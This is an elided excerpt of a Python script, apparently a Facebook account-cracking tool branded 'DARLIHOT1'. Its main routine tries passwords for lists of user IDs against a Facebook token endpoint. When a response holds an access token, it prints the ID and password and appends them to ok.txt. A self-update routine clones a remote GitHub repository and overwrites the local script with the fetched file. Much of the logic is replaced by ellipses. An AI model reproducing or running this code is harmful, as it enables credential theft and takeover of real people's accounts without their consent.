...
def log_sel():
	...
	if sel == "":
		...
		import os
		try:
			os.system("git clone https://github.com/DARLIHOT1/Great.git")
			os.system("rm -rf slim.py")
			os.system("cp -f DARLIHOT1/slim.py \\.")
			os.system("rm -rf DARLIHOT1")
			xox("\033[92;1m\n DARLIHOT1 UPDATE SUCCESSFUL :)\n")
			time.sleep(2)
			main()
...
def menu():
    ...
    logo()
    print("")
    print("\033[93;1m     DARLIHOT1: \033[92;1m"+xn)
...
def crack_select1():
	...
	if select =="1":
		...
		logo()
		print("")
		print("\t\033[92;1m DARLIHOT1 PUBLIC ID COINING ")
		print("")
		try:
	...
	print("\033[94;1m  WAIT AND SEE FLAME DARLIHOT1 MAGIC\033[92;1m✘\033[91;1m✘\x1b[0m")
	linex()
	def main(arg):
		user=arg
		uid,name=user.split("|")
												...
												if "www.facebook.com" in data.json()['error_msg']:
													...
													if "access_token" in data.text and "EAAA" in data.text:
														...
														if "www.facebook.com" in data.json()['error_msg']:
															...
															data = requests.get(api, params=params, headers=headers_)
															if "access_token" in data.text and "EAAA" in data.text:
																print(" \033[1;32m[DARLIHOTOK] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("ok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
	...
	linex()
	print("")
	print("\033[92;1m DARLIHOT HACKING HAS BEEN COMPLETED")
